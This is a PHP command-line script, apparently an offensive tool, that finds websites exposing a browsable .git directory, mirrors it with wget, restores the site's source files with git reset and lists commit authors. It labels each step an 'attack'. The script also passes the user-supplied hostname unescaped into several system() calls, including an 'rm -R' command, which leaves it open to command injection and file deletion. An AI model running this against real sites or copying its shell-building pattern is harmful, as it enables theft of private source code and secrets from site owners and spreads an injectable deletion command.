<?php

    include 'vendor/autoload.php';

    function command_exist($cmd) {
        $return = shell_exec(sprintf("which %s", escapeshellarg($cmd)));
        return !empty($return);
    }

    function page_have_git($hostname) {
        if(strpos($hostname, "http") === FALSE) {
            $hostname = "http://". $hostname;
        }

        $contentOfPage = @file_get_contents($hostname."/.git/");
        return (strpos($contentOfPage, "Index of") !== FALSE);
    }

    $cmdOnly = false;

    if(isset($argv[1])) {
        $hostname = $argv[1];
        $cmdOnly = true;
    }

    if(!$cmdOnly) {
        echo file_get_contents('logo');
    }

    $cliTypo = new \Grabower\CliTypo\CliTypo();

    if(!command_exist("git")) {
        $cliTypo->text()->color(
            $cliTypo->format()->bordered("Git not found on hacker machine"), 'red'
        );
        exit;
    }

    if(!$cmdOnly) {
        $cliTypo->text()->empty_line();
        $hostname = $cliTypo->component()->read("Enter host name of web page");
    }

    if(!page_have_git($hostname)) {
        $cliTypo->text()->color(
            $cliTypo->format()->bordered("Git directory not exist on web page"), 'red'
        );
        exit;
    } else {
        $cliTypo->text()->color("[*] Git directory exist on web page", 'green');
    }

    if(!$cmdOnly) {
        $readyToRunAttack = $cliTypo->component()->decision("Are you sure to start attack?");
        if(!$readyToRunAttack) {
            exit;
        }
    }

    $cliTypo->text()->color("[*] Starting attack on ". $hostname, 'green');

    system('rm -R output/'.$hostname);

    $hostname = str_replace("http://", "", $hostname);
    $hostname = str_replace("https://", "", $hostname);

    system('cd output && wget --mirror -I .git '.$hostname.'/.git/ -q --show-progress');

    $cliTypo->text()->color("[*] Git mirror created for ". $hostname, 'green');
    $cliTypo->text()->color("[*] Getting list of files for ". $hostname, 'green');

    system('cd output/'.$hostname.'/ && git status | grep "deleted"');

    if(!$cmdOnly) {
        $readyToRestore = $cliTypo->component()->decision("Are you sure to start restore files?");

        if (!$readyToRestore) {
            exit;
        }
    }

    $cliTypo->text()->color("[*] Starting restoring files for ". $hostname, 'green');
    system('cd output/'.$hostname.'/ && git reset --hard');
    $cliTypo->text()->color("[*] Restoring files done for ". $hostname, 'green');
    system('cd output/'.$hostname.'/ && ls -all');

    $cliTypo->text()->color("[*] Finished", 'green');

    $cliTypo->text()->color("[*] List of commit authors", 'green');

    system('cd output/'.$hostname.'/ && git log --format=\'%aN\' | sort -u');